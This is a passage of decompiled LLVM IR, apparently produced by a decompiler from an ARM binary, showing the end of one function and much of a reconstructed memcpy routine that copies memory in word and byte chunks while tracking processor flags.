  br i1 %v3_20698, label %.dec_label_pc_206a0_crit_edge, label %dec_label_pc_2069c

.dec_label_pc_206a0_crit_edge:                    ; preds = %.thread14
  %v0_206a0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_206a0

dec_label_pc_2069c:                               ; preds = %entry, %dec_label_pc_20668, %.thread14
  br label %dec_label_pc_206a0

dec_label_pc_206a0:                               ; preds = %.dec_label_pc_206a0_crit_edge, %dec_label_pc_2069c
  %v0_206a0 = phi i32 [ %v0_206a0.pre, %.dec_label_pc_206a0_crit_edge ], [ 0, %dec_label_pc_2069c ]
  store i32 %v9_20610, i32* @r6, align 4
  store i32 %v12_20610, i32* @r7, align 4
  ret i32 %v0_206a0

; uselistorder directives
  uselistorder i1 %v9_2068c, { 1, 0, 2 }
  uselistorder i32 %v1_2068c, { 1, 0 }
  uselistorder i32 %v0_2068c, { 0, 2, 1 }
  uselistorder i32 %v0_20684, { 2, 0, 1 }
  uselistorder i32 %v0_2067c, { 1, 0 }
  uselistorder i32 %v3_20658, { 2, 1, 0, 3 }
  uselistorder i32 %v0_20648, { 1, 0 }
  uselistorder i32 %v3_20630, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_20654, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 (i16*)* @getc_unlocked, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_206a0, { 1, 0 }
  uselistorder label %dec_label_pc_2069c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_2068c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_20630, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_206b0 = load i32, i32* @r1, align 4
  %v1_206b0 = load i32, i32* @r0, align 4
  %v2_206b0 = sub i32 %v0_206b0, %v1_206b0
  %v3_206b0 = icmp ult i32 %v0_206b0, %v1_206b0
  %v4_206b0 = xor i32 %v1_206b0, %v0_206b0
  %v5_206b0 = xor i32 %v2_206b0, %v0_206b0
  %v6_206b0 = and i32 %v5_206b0, %v4_206b0
  %v7_206b0 = icmp slt i32 %v6_206b0, 0
  store i1 %v7_206b0, i1* %cpsr_v.global-to-local, align 1
  %v8_206b0 = icmp slt i32 %v2_206b0, 0
  store i1 %v8_206b0, i1* %cpsr_n.global-to-local, align 1
  %v9_206b0 = icmp eq i32 %v0_206b0, %v1_206b0
  store i1 %v9_206b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_206b0, label %dec_label_pc_20904, label %dec_label_pc_206b8

dec_label_pc_206b8:                               ; preds = %entry
  br i1 %v9_206b0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_206b8
  %merge = phi i32 [ %v0_206b0, %dec_label_pc_206b8 ], [ %v2_20998, %bb150 ], [ %v11_209b4, %bb153 ], [ %v7_209b4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_206b8
  %v5_206bc = inttoptr i32 %v1_206b0 to i8*
  store i8* %v5_206bc, i8** %stack_var_-8, align 4
  %v8_206bc = load i32, i32* @lr, align 4
  %v0_206c0 = load i32, i32* @r2, align 4
  %v2_206c0 = add i32 %v0_206c0, -4
  store i32 %v2_206c0, i32* %r2.global-to-local, align 4
  %v4_206c0 = sub i32 3, %v0_206c0
  %v5_206c0 = and i32 %v4_206c0, %v0_206c0
  %v6_206c0 = icmp slt i32 %v5_206c0, 0
  store i1 %v6_206c0, i1* %cpsr_v.global-to-local, align 1
  %v7_206c0 = icmp slt i32 %v2_206c0, 0
  store i1 %v7_206c0, i1* %cpsr_n.global-to-local, align 1
  %v8_206c0 = icmp eq i32 %v0_206c0, 4
  store i1 %v8_206c0, i1* %cpsr_z.global-to-local, align 1
  %v5_206c4 = icmp slt i32 %v0_206c0, 4
  br i1 %v5_206c4, label %bb140, label %dec_label_pc_206c8

dec_label_pc_206c8:                               ; preds = %bb
  %v1_206c8 = urem i32 %v1_206b0, 4
  store i32 %v1_206c8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_206c8 = icmp eq i32 %v1_206c8, 0
  store i1 %v2_206c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_206c8, label %dec_label_pc_206d0, label %dec_label_pc_2077c

dec_label_pc_206d0:                               ; preds = %dec_label_pc_206c8
  %v1_206d0 = urem i32 %v0_206b0, 4
  store i32 %v1_206d0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_206d0 = icmp eq i32 %v1_206d0, 0
  store i1 %v2_206d0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_206b0 to i2
  br i1 %v2_206d0, label %dec_label_pc_206d8, label %dec_label_pc_207ac

dec_label_pc_206d8:                               ; preds = %dec_label_pc_206d0, %dec_label_pc_207a4
  %v0_206f094 = phi i32 [ %v1_206b0, %dec_label_pc_206d0 ], [ %v0_208cc77, %dec_label_pc_207a4 ]
  %v0_206ec93 = phi i32 [ %v0_206b0, %dec_label_pc_206d0 ], [ %v0_207a4, %dec_label_pc_207a4 ]
  %v0_206d8 = phi i32 [ %v2_206c0, %dec_label_pc_206d0 ], [ %v2_2079c, %dec_label_pc_207a4 ]
  %v1_206d8 = add i32 %v0_206d8, -8
  store i32 %v1_206d8, i32* %r2.global-to-local, align 4
  %v3_206d8 = sub i32 7, %v0_206d8
  %v4_206d8 = and i32 %v3_206d8, %v0_206d8
  %v5_206d8 = icmp slt i32 %v4_206d8, 0
  store i1 %v5_206d8, i1* %cpsr_v.global-to-local, align 1
  %v6_206d8 = icmp slt i32 %v1_206d8, 0
  store i1 %v6_206d8, i1* %cpsr_n.global-to-local, align 1
  %v7_206d8 = icmp eq i32 %v0_206d8, 8
  store i1 %v7_206d8, i1* %cpsr_z.global-to-local, align 1
  %v2_206dc = xor i1 %v6_206d8, %v5_206d8
  br i1 %v2_206dc, label %dec_label_pc_2072c, label %dec_label_pc_206e0

dec_label_pc_206e0:                               ; preds = %dec_label_pc_206d8
  %v1_206e0 = add i32 %v0_206d8, -28
  store i32 %v1_206e0, i32* %r2.global-to-local, align 4
  %v3_206e0 = sub i32 27, %v0_206d8
  %v4_206e0 = and i32 %v3_206e0, %v1_206d8
  %v5_206e0 = icmp slt i32 %v4_206e0, 0
  store i1 %v5_206e0, i1* %cpsr_v.global-to-local, align 1
  %v6_206e0 = icmp slt i32 %v1_206e0, 0
  store i1 %v6_206e0, i1* %cpsr_n.global-to-local, align 1
  %v7_206e0 = icmp eq i32 %v1_206d8, 20
  store i1 %v7_206e0, i1* %cpsr_z.global-to-local, align 1
  %v2_206e4 = xor i1 %v6_206e0, %v5_206e0
  br i1 %v2_206e4, label %dec_label_pc_20718, label %dec_label_pc_206e8

dec_label_pc_206e8:                               ; preds = %dec_label_pc_206e0
  %v0_206e8 = load i32, i32* @r4, align 4
  store i32 %v0_206e8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_206ec

dec_label_pc_206ec:                               ; preds = %dec_label_pc_206ec.dec_label_pc_206ec_crit_edge, %dec_label_pc_206e8
  %v0_206f0 = phi i32 [ %v12_206f8, %dec_label_pc_206ec.dec_label_pc_206ec_crit_edge ], [ %v0_206f094, %dec_label_pc_206e8 ]
  %v0_206ec = phi i32 [ %v0_206ec.pre, %dec_label_pc_206ec.dec_label_pc_206ec_crit_edge ], [ %v0_206ec93, %dec_label_pc_206e8 ]
  %v1_206ec = inttoptr i32 %v0_206ec to i32*
  %v2_206ec = load i32, i32* %v1_206ec, align 4
  store i32 %v2_206ec, i32* %r3.global-to-local, align 4
  %v3_206ec = add i32 %v0_206ec, 4
  %v4_206ec = inttoptr i32 %v3_206ec to i32*
  %v5_206ec = load i32, i32* %v4_206ec, align 4
  store i32 %v5_206ec, i32* %r4.global-to-local, align 4
  %v6_206ec = add i32 %v0_206ec, 8
  %v7_206ec = inttoptr i32 %v6_206ec to i32*
  %v8_206ec = load i32, i32* %v7_206ec, align 4
  store i32 %v8_206ec, i32* %ip.global-to-local, align 4
  %v9_206ec = add i32 %v0_206ec, 12
  %v10_206ec = inttoptr i32 %v9_206ec to i32*
  %v11_206ec = load i32, i32* %v10_206ec, align 4
  store i32 %v11_206ec, i32* %lr.global-to-local, align 4
  %v12_206ec = add i32 %v0_206ec, 16
  store i32 %v12_206ec, i32* %r1.global-to-local, align 4
  %v1_206f0 = inttoptr i32 %v0_206f0 to i32*
  store i32 %v2_206ec, i32* %v1_206f0, align 4
  %v3_206f0 = add i32 %v0_206f0, 4
  %v4_206f0 = inttoptr i32 %v3_206f0 to i32*
  %v5_206f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_206f0, i32* %v4_206f0, align 4
  %v6_206f0 = add i32 %v0_206f0, 8
  %v7_206f0 = inttoptr i32 %v6_206f0 to i32*
  %v8_206f0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_206f0, i32* %v7_206f0, align 4
  %v9_206f0 = add i32 %v0_206f0, 12
  %v10_206f0 = inttoptr i32 %v9_206f0 to i32*
  %v11_206f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_206f0, i32* %v10_206f0, align 4
  %v12_206f0 = add i32 %v0_206f0, 16
  store i32 %v12_206f0, i32* %r0.global-to-local, align 4
  %v0_206f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_206f4 = inttoptr i32 %v0_206f4 to i32*
  %v2_206f4 = load i32, i32* %v1_206f4, align 4
  store i32 %v2_206f4, i32* @r3, align 4
  %v3_206f4 = add i32 %v0_206f4, 4
  %v4_206f4 = inttoptr i32 %v3_206f4 to i32*
  %v5_206f4 = load i32, i32* %v4_206f4, align 4
  store i32 %v5_206f4, i32* %r4.global-to-local, align 4
  %v6_206f4 = add i32 %v0_206f4, 8
  %v7_206f4 = inttoptr i32 %v6_206f4 to i32*
  %v8_206f4 = load i32, i32* %v7_206f4, align 4
  store i32 %v8_206f4, i32* @ip, align 4
  %v9_206f4 = add i32 %v0_206f4, 12
  %v10_206f4 = inttoptr i32 %v9_206f4 to i32*
  %v11_206f4 = load i32, i32* %v10_206f4, align 4
  store i32 %v11_206f4, i32* %lr.global-to-local, align 4
  %v12_206f4 = add i32 %v0_206f4, 16
  store i32 %v12_206f4, i32* @r1, align 4
  %v1_206f8 = inttoptr i32 %v12_206f0 to i32*
  store i32 %v2_206f4, i32* %v1_206f8, align 4
  %v3_206f8 = add i32 %v0_206f0, 20
  %v4_206f8 = inttoptr i32 %v3_206f8 to i32*
  %v5_206f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_206f8, i32* %v4_206f8, align 4
  %v6_206f8 = add i32 %v0_206f0, 24
  %v7_206f8 = inttoptr i32 %v6_206f8 to i32*
  %v8_206f8 = load i32, i32* @ip, align 4
  store i32 %v8_206f8, i32* %v7_206f8, align 4
  %v9_206f8 = add i32 %v0_206f0, 28
  %v10_206f8 = inttoptr i32 %v9_206f8 to i32*
  %v11_206f8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_206f8, i32* %v10_206f8, align 4
  %v12_206f8 = add i32 %v0_206f0, 32
  store i32 %v12_206f8, i32* @r0, align 4
  %v0_206fc = load i32, i32* %r2.global-to-local, align 4
  %v1_206fc = add i32 %v0_206fc, -32
  store i32 %v1_206fc, i32* %r2.global-to-local, align 4
  %v3_206fc = sub i32 31, %v0_206fc
  %v4_206fc = and i32 %v3_206fc, %v0_206fc
  %v5_206fc = icmp slt i32 %v4_206fc, 0
  %v6_206fc = icmp slt i32 %v1_206fc, 0
  %v2_20700 = xor i1 %v6_206fc, %v5_206fc
  br i1 %v2_20700, label %dec_label_pc_20704, label %dec_label_pc_206ec.dec_label_pc_206ec_crit_edge

dec_label_pc_206ec.dec_label_pc_206ec_crit_edge:  ; preds = %dec_label_pc_206ec
  %v0_206ec.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_206ec

dec_label_pc_20704:                               ; preds = %dec_label_pc_206ec
  %v1_20704 = add i32 %v0_206fc, -16
  %v3_20704 = add i32 %v0_206fc, 2147483616
  %v4_20704 = and i32 %v1_20704, %v3_20704
  %v5_20704 = icmp slt i32 %v4_20704, 0
  store i1 %v5_20704, i1* %cpsr_v.global-to-local, align 1
  %v6_20704 = icmp slt i32 %v1_20704, 0
  store i1 %v6_20704, i1* %cpsr_n.global-to-local, align 1
  %v7_20704 = icmp eq i32 %v1_20704, 0
  store i1 %v7_20704, i1* %cpsr_z.global-to-local, align 1
  %v2_20708 = xor i1 %v6_20704, %v5_20704
  br i1 %v2_20708, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_20704
  %v3_20708 = load i32, i32* @r1, align 4
  %v4_20708 = inttoptr i32 %v3_20708 to i32*
  %v5_20708 = load i32, i32* %v4_20708, align 4
  store i32 %v5_20708, i32* @r3, align 4
  %v6_20708 = add i32 %v3_20708, 4
  %v7_20708 = inttoptr i32 %v6_20708 to i32*
  %v8_20708 = load i32, i32* %v7_20708, align 4
  store i32 %v8_20708, i32* %r4.global-to-local, align 4
  %v9_20708 = add i32 %v3_20708, 8
  %v10_20708 = inttoptr i32 %v9_20708 to i32*
  %v11_20708 = load i32, i32* %v10_20708, align 4
  store i32 %v11_20708, i32* @ip, align 4
  %v12_20708 = add i32 %v3_20708, 12
  %v13_20708 = inttoptr i32 %v12_20708 to i32*
  %v14_20708 = load i32, i32* %v13_20708, align 4
  store i32 %v14_20708, i32* %lr.global-to-local, align 4
  %v15_20708 = add i32 %v3_20708, 16
  store i32 %v15_20708, i32* @r1, align 4
  %v4_2070c = inttoptr i32 %v12_206f8 to i32*
  store i32 %v5_20708, i32* %v4_2070c, align 4
  %v6_2070c = add i32 %v0_206f0, 36
  %v7_2070c = inttoptr i32 %v6_2070c to i32*
  %v8_2070c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_2070c, i32* %v7_2070c, align 4
  %v9_2070c = add i32 %v0_206f0, 40
  %v10_2070c = inttoptr i32 %v9_2070c to i32*
  %v11_2070c = load i32, i32* @ip, align 4
  store i32 %v11_2070c, i32* %v10_2070c, align 4
  %v12_2070c = add i32 %v0_206f0, 44
  %v13_2070c = inttoptr i32 %v12_2070c to i32*
  %v14_2070c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_2070c, i32* %v13_2070c, align 4
  %v15_2070c = add i32 %v0_206f0, 48
  store i32 %v15_2070c, i32* @r0, align 4
  %v3_20710 = load i32, i32* %r2.global-to-local, align 4
  %v4_20710 = add i32 %v3_20710, -16
  store i32 %v4_20710, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_20704, %bb136
  %v3_20720102111 = phi i32 [ %v15_2070c, %bb136 ], [ %v12_206f8, %dec_label_pc_20704 ]
  %v0_20718.pre = phi i32 [ %v4_20710, %bb136 ], [ %v1_206fc, %dec_label_pc_20704 ]
  %v2_20714 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_20714, i32* @r4, align 4
  br label %dec_label_pc_20718

dec_label_pc_20718:                               ; preds = %dec_label_pc_206e0, %bb137
  %v3_20720101 = phi i32 [ %v0_206f094, %dec_label_pc_206e0 ], [ %v3_20720102111, %bb137 ]
  %v0_20718 = phi i32 [ %v1_206e0, %dec_label_pc_206e0 ], [ %v0_20718.pre, %bb137 ]
  %v1_20718 = add i32 %v0_20718, 20
  store i32 %v1_20718, i32* %r2.global-to-local, align 4
  %v3_20718 = sub i32 0, %v0_20718
  %v4_20718 = and i32 %v1_20718, %v3_20718
  %v5_20718 = icmp slt i32 %v4_20718, 0
  store i1 %v5_20718, i1* %cpsr_v.global-to-local, align 1
  %v6_20718 = icmp slt i32 %v1_20718, 0
  store i1 %v6_20718, i1* %cpsr_n.global-to-local, align 1
  %v7_20718 = icmp eq i32 %v1_20718, 0
  store i1 %v7_20718, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2071c

dec_label_pc_2071c:                               ; preds = %.thread115, %dec_label_pc_20718
  %v0_2072c.pre157 = phi i32 [ %v0_2072c.pre, %.thread115 ], [ %v1_20718, %dec_label_pc_20718 ]
  %v3_20720 = phi i32 [ %v3_2072099116, %.thread115 ], [ %v3_20720101, %dec_label_pc_20718 ]
  %v1_20724 = phi i1 [ %v1_20728, %.thread115 ], [ %v5_20718, %dec_label_pc_20718 ]
  %v0_20724 = phi i1 [ %v0_20728, %.thread115 ], [ %v6_20718, %dec_label_pc_20718 ]
  %v2_2071c = xor i1 %v1_20724, %v0_20724
  br i1 %v2_2071c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_2071c
  %v3_2071c = load i32, i32* @r1, align 4
  %v4_2071c = inttoptr i32 %v3_2071c to i32*
  %v5_2071c = load i32, i32* %v4_2071c, align 4
  store i32 %v5_2071c, i32* @r3, align 4
  %v6_2071c = add i32 %v3_2071c, 4
  %v7_2071c = inttoptr i32 %v6_2071c to i32*
  %v8_2071c = load i32, i32* %v7_2071c, align 4
  store i32 %v8_2071c, i32* @ip, align 4
  %v9_2071c = add i32 %v3_2071c, 8
  %v10_2071c = inttoptr i32 %v9_2071c to i32*
  %v11_2071c = load i32, i32* %v10_2071c, align 4
  store i32 %v11_2071c, i32* %lr.global-to-local, align 4
  %v12_2071c = add i32 %v3_2071c, 12
  store i32 %v12_2071c, i32* @r1, align 4
  %v4_20720 = inttoptr i32 %v3_20720 to i32*
  store i32 %v5_2071c, i32* %v4_20720, align 4
  %v6_20720 = add i32 %v3_20720, 4
  %v7_20720 = inttoptr i32 %v6_20720 to i32*
  %v8_20720 = load i32, i32* @ip, align 4
  store i32 %v8_20720, i32* %v7_20720, align 4
  %v9_20720 = add i32 %v3_20720, 8
  %v10_20720 = inttoptr i32 %v9_20720 to i32*
  %v11_20720 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_20720, i32* %v10_20720, align 4
  %v12_20720 = add i32 %v3_20720, 12
  store i32 %v12_20720, i32* @r0, align 4
  %v3_20724 = load i32, i32* %r2.global-to-local, align 4
  %v4_20724 = add i32 %v3_20724, -12
  store i32 %v4_20724, i32* %r2.global-to-local, align 4
  %v6_20724 = sub i32 11, %v3_20724
  %v7_20724 = and i32 %v6_20724, %v3_20724
  %v8_20724 = icmp slt i32 %v7_20724, 0
  store i1 %v8_20724, i1* %cpsr_v.global-to-local, align 1
  %v9_20724 = icmp slt i32 %v4_20724, 0
  store i1 %v9_20724, i1* %cpsr_n.global-to-local, align 1
  %v10_20724 = icmp eq i32 %v3_20724, 12
  store i1 %v10_20724, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_2071c, %bb138
  %v0_2072c.pre = phi i32 [ %v4_20724, %bb138 ], [ %v0_2072c.pre157, %dec_label_pc_2071c ]
  %v3_2072099116 = phi i32 [ %v12_20720, %bb138 ], [ %v3_20720, %dec_label_pc_2071c ]
  %v1_20728 = phi i1 [ %v8_20724, %bb138 ], [ %v1_20724, %dec_label_pc_2071c ]
  %v0_20728 = phi i1 [ %v9_20724, %bb138 ], [ %v0_20724, %dec_label_pc_2071c ]
  %v2_20728 = xor i1 %v1_20728, %v0_20728
  br i1 %v2_20728, label %dec_label_pc_2072c, label %dec_label_pc_2071c

dec_label_pc_2072c:                               ; preds = %.thread115, %dec_label_pc_206d8
  %v4_2073c = phi i32 [ %v0_206f094, %dec_label_pc_206d8 ], [ %v3_2072099116, %.thread115 ]
  %v0_2072c = phi i32 [ %v1_206d8, %dec_label_pc_206d8 ], [ %v0_2072c.pre, %.thread115 ]
  %v1_2072c = add i32 %v0_2072c, 8
  store i32 %v1_2072c, i32* %r2.global-to-local, align 4
  %v3_2072c = sub i32 0, %v0_2072c
  %v4_2072c = and i32 %v1_2072c, %v3_2072c
  %v5_2072c = icmp slt i32 %v4_2072c, 0
  store i1 %v5_2072c, i1* %cpsr_v.global-to-local, align 1
  %v6_2072c = icmp slt i32 %v1_2072c, 0
  store i1 %v6_2072c, i1* %cpsr_n.global-to-local, align 1
  %v7_2072c = icmp eq i32 %v1_2072c, 0
  store i1 %v7_2072c, i1* %cpsr_z.global-to-local, align 1
  %v2_20730 = xor i1 %v6_2072c, %v5_2072c
  br i1 %v2_20730, label %bb140, label %dec_label_pc_20734

dec_label_pc_20734:                               ; preds = %dec_label_pc_2072c
  %v1_20734 = add i32 %v0_2072c, 4
  store i32 %v1_20734, i32* %r2.global-to-local, align 4
  %v3_20734 = sub i32 -5, %v0_2072c
  %v4_20734 = and i32 %v3_20734, %v1_2072c
  %v5_20734 = icmp slt i32 %v4_20734, 0
  store i1 %v5_20734, i1* %cpsr_v.global-to-local, align 1
  %v6_20734 = icmp slt i32 %v1_20734, 0
  store i1 %v6_20734, i1* %cpsr_n.global-to-local, align 1
  %v7_20734 = icmp eq i32 %v1_2072c, 4
  store i1 %v7_20734, i1* %cpsr_z.global-to-local, align 1
  %v2_20738 = xor i1 %v6_20734, %v5_20734
  %v3_20738 = load i32, i32* @r1, align 4
  %v4_20738 = inttoptr i32 %v3_20738 to i32*
  %v5_20738 = load i32, i32* %v4_20738, align 4
  store i32 %v5_20738, i32* @r3, align 4
  %v7_20738 = add i32 %v3_20738, 4
  br i1 %v2_20738, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_20734
  store i32 %v7_20738, i32* @r1, align 4
  %v5_2073c = inttoptr i32 %v4_2073c to i32*
  store i32 %v5_20738, i32* %v5_2073c, align 4
  %v6_2073c = load i32, i32* @r0, align 4
  %v7_2073c = add i32 %v6_2073c, 4
  store i32 %v7_2073c, i32* @r0, align 4
  %v0_2074c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_20734
  %v7_20740 = inttoptr i32 %v7_20738 to i32*
  %v8_20740 = load i32, i32* %v7_20740, align 4
  store i32 %v8_20740, i32* @ip, align 4
  %v9_20740 = add i32 %v3_20738, 8
  store i32 %v9_20740, i32* @r1, align 4
  %v4_20744 = inttoptr i32 %v4_2073c to i32*
  store i32 %v5_20738, i32* %v4_20744, align 4
  %v6_20744 = add i32 %v4_2073c, 4
  %v7_20744 = inttoptr i32 %v6_20744 to i32*
  %v8_20744 = load i32, i32* @ip, align 4
  store i32 %v8_20744, i32* %v7_20744, align 4
  %v9_20744 = add i32 %v4_2073c, 8
  store i32 %v9_20744, i32* @r0, align 4
  %v3_20748 = load i32, i32* %r2.global-to-local, align 4
  %v4_20748 = add i32 %v3_20748, -4
  store i32 %v4_20748, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_2072c, %bb, %dec_label_pc_208fc, %dec_label_pc_20890, %dec_label_pc_20824, %bb139
  %v0_2074c = phi i32 [ %v0_2074c.pre, %.thread122 ], [ %v2_2079c, %.thread128 ], [ %v1_2072c, %dec_label_pc_2072c ], [ %v2_206c0, %bb ], [ %v0_2074c61, %dec_label_pc_208fc ], [ %v0_2074c60, %dec_label_pc_20890 ], [ %v0_2074c59, %dec_label_pc_20824 ], [ %v4_20748, %bb139 ]
  %v1_2074c = add i32 %v0_2074c, 4
  store i32 %v1_2074c, i32* %r2.global-to-local, align 4
  %v3_2074c = sub i32 0, %v0_2074c
  %v4_2074c = and i32 %v1_2074c, %v3_2074c
  %v5_2074c = icmp slt i32 %v4_2074c, 0
  store i1 %v5_2074c, i1* %cpsr_v.global-to-local, align 1
  %v6_2074c = icmp slt i32 %v1_2074c, 0
  store i1 %v6_2074c, i1* %cpsr_n.global-to-local, align 1
  %v7_2074c = icmp eq i32 %v1_2074c, 0
  store i1 %v7_2074c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2074c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_20754.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_20750 = load i8*, i8** %stack_var_-8, align 4
  %v4_20750 = ptrtoint i8* %v3_20750 to i32
  store i32 %v4_20750, i32* @r0, align 4
  store i32 %v8_206bc, i32* %r3.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_20754 = phi i32 [ %v0_20754.pre, %bb140.bb142_crit_edge ], [ %v8_206bc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_2074c, i32 %v0_20754)
  %v0_20758 = load i32, i32* %r2.global-to-local, align 4
  %v1_20758 = add i32 %v0_20758, -2
  %v3_20758 = sub i32 1, %v0_20758
  %v4_20758 = and i32 %v3_20758, %v0_20758
  %v5_20758 = icmp slt i32 %v4_20758, 0
  store i1 %v5_20758, i1* %cpsr_v.global-to-local, align 1
  %v6_20758 = icmp slt i32 %v1_20758, 0
  store i1 %v6_20758, i1* %cpsr_n.global-to-local, align 1
  %v7_20758 = icmp eq i32 %v0_20758, 2
  store i1 %v7_20758, i1* %cpsr_z.global-to-local, align 1
  %v0_2075c = load i32, i32* @r1, align 4
  %v1_2075c = inttoptr i32 %v0_2075c to i8*
  %v2_2075c = load i8, i8* %v1_2075c, align 1
  %v3_2075c = zext i8 %v2_2075c to i32
  store i32 %v3_2075c, i32* %r3.global-to-local, align 4
  %v5_2075c = add i32 %v0_2075c, 1
  store i32 %v5_2075c, i32* %r1.global-to-local, align 4
  %v2_20760 = load i32, i32* @r0, align 4
  %v3_20760 = inttoptr i32 %v2_20760 to i8*
  store i8 %v2_2075c, i8* %v3_20760, align 1
  %v4_20760 = load i32, i32* @r0, align 4
  %v5_20760 = add i32 %v4_20760, 1
  store i32 %v5_20760, i32* %r0.global-to-local, align 4
  %v0_20764 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_20764 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_20764 = xor i1 %v0_20764, %v1_20764
  br i1 %v2_20764, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_20764 = load i32, i32* %r1.global-to-local, align 4
  %v4_20764 = inttoptr i32 %v3_20764 to i8*
  %v5_20764 = load i8, i8* %v4_20764, align 1
  %v6_20764 = zext i8 %v5_20764 to i32
  store i32 %v6_20764, i32* %r3.global-to-local, align 4
  %v8_20764 = add i32 %v3_20764, 1
  store i32 %v8_20764, i32* %r1.global-to-local, align 4
  %v6_20768 = inttoptr i32 %v5_20760 to i8*
  store i8 %v5_20764, i8* %v6_20768, align 1
  %v7_20768 = load i32, i32* %r0.global-to-local, align 4
  %v8_20768 = add i32 %v7_20768, 1
  store i32 %v8_20768, i32* %r0.global-to-local, align 4
  %v1_2076c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_2076c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_20770 = phi i32 [ %v8_20768, %bb143 ], [ %v5_20760, %bb142 ]
  %v2_20770 = phi i1 [ %v2_2076c.pre, %bb143 ], [ %v1_20764, %bb142 ]
  %v1_20770 = phi i1 [ %v1_2076c.pre, %bb143 ], [ %v0_20764, %bb142 ]
  %v0_2076c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_2076c = xor i1 %v2_20770, %v1_20770
  %v4_2076c = or i1 %v0_2076c, %v3_2076c
  br i1 %v4_2076c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_2076c = load i32, i32* %r1.global-to-local, align 4
  %v6_2076c = inttoptr i32 %v5_2076c to i8*
  %v7_2076c = load i8, i8* %v6_2076c, align 1
  %v8_2076c = zext i8 %v7_2076c to i32
  store i32 %v8_2076c, i32* %r3.global-to-local, align 4
  %v10_2076c = add i32 %v5_2076c, 1
  store i32 %v10_2076c, i32* %r1.global-to-local, align 4
  %v8_20770 = inttoptr i32 %v7_20770 to i8*
  store i8 %v7_2076c, i8* %v8_20770, align 1
  %v9_20770 = load i32, i32* %r0.global-to-local, align 4
  %v10_20770 = add i32 %v9_20770, 1
  store i32 %v10_20770, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_20774 = load i8*, i8** %stack_var_-8, align 4
  %v3_20774 = ptrtoint i8* %v2_20774 to i32
  store i32 %v3_20774, i32* @r0, align 4
  store i32 %v8_206bc, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_206bc)
  %v0_2077c.pre = load i32, i32* @ip, align 4
  %v0_20784.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_20788.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_2077c

dec_label_pc_2077c:                               ; preds = %dec_label_pc_206c8, %.thread126
